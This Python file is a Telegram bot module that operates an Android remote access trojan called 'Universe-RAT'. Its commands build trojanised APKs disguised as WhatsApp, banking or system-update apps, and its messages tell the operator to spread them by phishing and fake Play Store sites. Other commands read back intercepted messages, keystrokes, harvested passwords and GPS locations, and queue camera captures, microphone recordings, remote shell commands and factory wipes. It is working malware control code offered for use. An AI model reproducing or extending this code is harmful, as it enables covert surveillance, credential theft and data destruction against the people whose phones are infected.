#!/usr/bin/env python3
"""
HERMES INTEGRATION - Universe-RAT Telegram Bot Commands
Allows control of RAT framework directly from Telegram bot
"""

import sys
import os
sys.path.append('/f/universe_rat_system')

from telegram import Update
from telegram.ext import ContextTypes
import sqlite3
import json
from datetime import datetime
from pathlib import Path

# ==================== RAT COMMANDS FOR HERMES BOT ====================

async def cmd_rat_build(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Build custom RAT APK
    Usage: /rat build --type system_update --c2 https://your-c2.com
    """
    args = context.args
    
    if not args:
        await update.message.reply_text(
            "🔨 UNIVERSE-RAT APK BUILDER\n\n"
            "Usage: /rat build [options]\n\n"
            "Options:\n"
            "  --type <payload_type>\n"
            "    • system_update (Android update)\n"
            "    • whatsapp_clone (Fake WhatsApp)\n"
            "    • game (Game mod)\n"
            "    • utility (Cleaner/Battery app)\n"
            "    • banking (Banking app)\n\n"
            "  --c2 <server_url> (optional)\n\n"
            "Example:\n"
            "/rat build --type whatsapp_clone --c2 https://api.example.com"
        )
        return
    
    # Parse arguments
    payload_type = "system_update"
    c2_server = "https://api.system-update-service.com"
    
    for i, arg in enumerate(args):
        if arg == '--type' and i+1 < len(args):
            payload_type = args[i+1]
        elif arg == '--c2' and i+1 < len(args):
            c2_server = args[i+1]
    
    await update.message.reply_text(f"🔨 Building RAT APK...\nType: {payload_type}\nC2: {c2_server}")
    
    # Build APK
    from apk_builder.builder import UniverseRATBuilder
    builder = UniverseRATBuilder()
    
    try:
        apk_path = builder.build_apk(payload_type, None, c2_server)
        
        # Upload APK to Telegram
        with open(apk_path, 'rb') as apk:
            await update.message.reply_document(
                document=apk,
                filename=f"universe_rat_{payload_type}.apk",
                caption=f"✅ UNIVERSE-RAT APK READY\n\n"
                        f"Type: {payload_type}\n"
                        f"C2 Server: {c2_server}\n\n"
                        f"📱 DEPLOYMENT:\n"
                        f"1. Share via SMS/WhatsApp\n"
                        f"2. Host on fake Play Store site\n"
                        f"3. Direct install via USB"
            )
        
        # Upload to gofile.io for easy sharing
        upload_result = upload_to_gofile(apk_path)
        if upload_result:
            await update.message.reply_text(
                f"🔗 DOWNLOAD LINK:\n{upload_result}\n\n"
                f"Share this link with target via phishing"
            )
    
    except Exception as e:
        await update.message.reply_text(f"❌ Build failed: {str(e)}")

async def cmd_rat_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    List all compromised devices
    Usage: /rat devices
    """
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('SELECT device_id, model, phone_number, android_version, is_rooted, status, last_seen FROM devices')
    devices = c.fetchall()
    conn.close()
    
    if not devices:
        await update.message.reply_text("📱 No devices compromised yet\n\nBuild and deploy an APK first!")
        return
    
    response = "📱 COMPROMISED DEVICES:\n\n"
    
    for dev in devices:
        device_id, model, phone, android, rooted, status, last_seen = dev
        
        status_emoji = "🟢" if status == 'online' else "🔴"
        root_emoji = "🔓" if rooted else "🔒"
        
        response += f"{status_emoji} {root_emoji} Device {device_id[:8]}...\n"
        response += f"   Model: {model}\n"
        response += f"   Phone: {phone}\n"
        response += f"   Android: {android}\n"
        response += f"   Last seen: {last_seen}\n\n"
    
    await update.message.reply_text(response)

async def cmd_rat_camera(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Take photo from device camera
    Usage: /rat camera <device_id> [front|back]
    """
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: /rat camera <device_id> [front|back]")
        return
    
    device_id = args[0]
    camera = args[1] if len(args) > 1 else "front"
    
    # Queue camera command
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO commands (device_id, command, params, timestamp) VALUES (?, ?, ?, ?)',
              (device_id, 'camera', json.dumps({'camera': camera}), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(
        f"📸 Camera command sent!\n\n"
        f"Device: {device_id}\n"
        f"Camera: {camera}\n\n"
        f"Photo will be delivered within 60 seconds..."
    )

async def cmd_rat_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Get device location
    Usage: /rat location <device_id>
    """
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: /rat location <device_id>")
        return
    
    device_id = args[0]
    
    # Get latest location
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('SELECT latitude, longitude, accuracy, timestamp FROM locations WHERE device_id=? ORDER BY timestamp DESC LIMIT 1',
              (device_id,))
    loc = c.fetchone()
    conn.close()
    
    if not loc:
        await update.message.reply_text(f"❌ No location data for device {device_id}")
        return
    
    lat, lon, accuracy, timestamp = loc
    
    await update.message.reply_text(
        f"📍 DEVICE LOCATION\n\n"
        f"Device: {device_id}\n"
        f"Coordinates: {lat}, {lon}\n"
        f"Accuracy: {accuracy}m\n"
        f"Time: {timestamp}\n\n"
        f"🗺️ Google Maps:\nhttps://maps.google.com/?q={lat},{lon}"
    )
    
    # Send as location pin
    await update.message.reply_location(latitude=lat, longitude=lon)

async def cmd_rat_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Dump intercepted messages
    Usage: /rat messages <device_id> [limit]
    """
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: /rat messages <device_id> [limit]")
        return
    
    device_id = args[0]
    limit = int(args[1]) if len(args) > 1 else 20
    
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('SELECT app, sender, content, timestamp FROM messages WHERE device_id=? ORDER BY timestamp DESC LIMIT ?',
              (device_id, limit))
    messages = c.fetchall()
    conn.close()
    
    if not messages:
        await update.message.reply_text(f"📱 No messages intercepted for device {device_id}")
        return
    
    response = f"📱 INTERCEPTED MESSAGES ({device_id[:8]})\n\n"
    
    for app, sender, content, timestamp in messages:
        response += f"[{app}] {sender}\n"
        response += f"{content[:200]}\n"
        response += f"🕐 {timestamp}\n\n"
        
        # Telegram message limit
        if len(response) > 3500:
            await update.message.reply_text(response)
            response = ""
    
    if response:
        await update.message.reply_text(response)

async def cmd_rat_keylog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    View keylogger data
    Usage: /rat keylog <device_id> [limit]
    """
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: /rat keylog <device_id> [limit]")
        return
    
    device_id = args[0]
    limit = int(args[1]) if len(args) > 1 else 50
    
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('SELECT app, text, timestamp FROM keystrokes WHERE device_id=? ORDER BY timestamp DESC LIMIT ?',
              (device_id, limit))
    keystrokes = c.fetchall()
    conn.close()
    
    if not keystrokes:
        await update.message.reply_text(f"⌨️ No keystrokes captured for device {device_id}")
        return
    
    response = f"⌨️ KEYLOGGER DATA ({device_id[:8]})\n\n"
    
    for app, text, timestamp in keystrokes:
        response += f"[{app}] {text}\n"
        response += f"🕐 {timestamp}\n\n"
        
        if len(response) > 3500:
            await update.message.reply_text(response)
            response = ""
    
    if response:
        await update.message.reply_text(response)

async def cmd_rat_creds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    View harvested credentials
    Usage: /rat creds <device_id>
    """
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: /rat creds <device_id>")
        return
    
    device_id = args[0]
    
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('SELECT service, username, password, timestamp FROM credentials WHERE device_id=? ORDER BY timestamp DESC',
              (device_id,))
    creds = c.fetchall()
    conn.close()
    
    if not creds:
        await update.message.reply_text(f"🔑 No credentials harvested for device {device_id}")
        return
    
    response = f"🔑 HARVESTED CREDENTIALS ({device_id[:8]})\n\n"
    
    for service, username, password, timestamp in creds:
        response += f"🌐 {service}\n"
        response += f"👤 {username}\n"
        response += f"🔐 {password}\n"
        response += f"🕐 {timestamp}\n\n"
    
    await update.message.reply_text(response)

async def cmd_rat_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Execute shell command on device
    Usage: /rat shell <device_id> <command>
    """
    args = context.args
    
    if len(args) < 2:
        await update.message.reply_text("Usage: /rat shell <device_id> <command>")
        return
    
    device_id = args[0]
    command = ' '.join(args[1:])
    
    # Queue shell command
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO commands (device_id, command, params, timestamp) VALUES (?, ?, ?, ?)',
              (device_id, 'shell', json.dumps({'command': command}), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(
        f"💻 Shell command queued\n\n"
        f"Device: {device_id}\n"
        f"Command: {command}\n\n"
        f"Result will be delivered shortly..."
    )

async def cmd_rat_mic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Record audio from microphone
    Usage: /rat mic <device_id> <seconds>
    """
    args = context.args
    
    if len(args) < 2:
        await update.message.reply_text("Usage: /rat mic <device_id> <seconds>")
        return
    
    device_id = args[0]
    duration = int(args[1])
    
    # Queue mic command
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO commands (device_id, command, params, timestamp) VALUES (?, ?, ?, ?)',
              (device_id, 'microphone', json.dumps({'duration': duration}), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(
        f"🎤 Recording audio...\n\n"
        f"Device: {device_id}\n"
        f"Duration: {duration} seconds\n\n"
        f"Audio file will be delivered shortly..."
    )

async def cmd_rat_wipe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Wipe device (factory reset) - DESTRUCTIVE
    Usage: /rat wipe <device_id> --confirm
    """
    args = context.args
    
    if len(args) < 2 or args[1] != '--confirm':
        await update.message.reply_text(
            "⚠️ DESTRUCTIVE COMMAND\n\n"
            "This will factory reset the device and DELETE ALL DATA.\n\n"
            "To proceed: /rat wipe <device_id> --confirm"
        )
        return
    
    device_id = args[0]
    
    # Queue wipe command
    conn = sqlite3.connect('/f/universe_rat_system/c2_server/universe_rat.db')
    c = conn.cursor()
    c.execute('INSERT INTO commands (device_id, command, params, timestamp) VALUES (?, ?, ?, ?)',
              (device_id, 'wipe', '{}', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(
        f"💀 WIPE COMMAND SENT\n\n"
        f"Device {device_id} will be factory reset.\n"
        f"ALL DATA WILL BE DELETED.\n\n"
        f"This cannot be undone."
    )

def upload_to_gofile(file_path):
    """Upload file to gofile.io and return download link"""
    import requests
    
    try:
        # Get upload server
        response = requests.get('https://api.gofile.io/getServer')
        server = response.json()['data']['server']
        
        # Upload file
        with open(file_path, 'rb') as f:
            upload_response = requests.post(
                f'https://{server}.gofile.io/uploadFile',
                files={'file': f}
            )
        
        result = upload_response.json()
        if result['status'] == 'ok':
            return result['data']['downloadPage']
    except:
        return None

# ==================== COMMAND REGISTRATION ====================

def register_rat_commands(application):
    """Register all RAT commands with Telegram bot"""
    from telegram.ext import CommandHandler
    
    application.add_handler(CommandHandler("rat_build", cmd_rat_build))
    application.add_handler(CommandHandler("rat_devices", cmd_rat_devices))
    application.add_handler(CommandHandler("rat_camera", cmd_rat_camera))
    application.add_handler(CommandHandler("rat_location", cmd_rat_location))
    application.add_handler(CommandHandler("rat_messages", cmd_rat_messages))
    application.add_handler(CommandHandler("rat_keylog", cmd_rat_keylog))
    application.add_handler(CommandHandler("rat_creds", cmd_rat_creds))
    application.add_handler(CommandHandler("rat_shell", cmd_rat_shell))
    application.add_handler(CommandHandler("rat_mic", cmd_rat_mic))
    application.add_handler(CommandHandler("rat_wipe", cmd_rat_wipe))
    
    print("✅ Universe-RAT commands registered with Telegram bot")
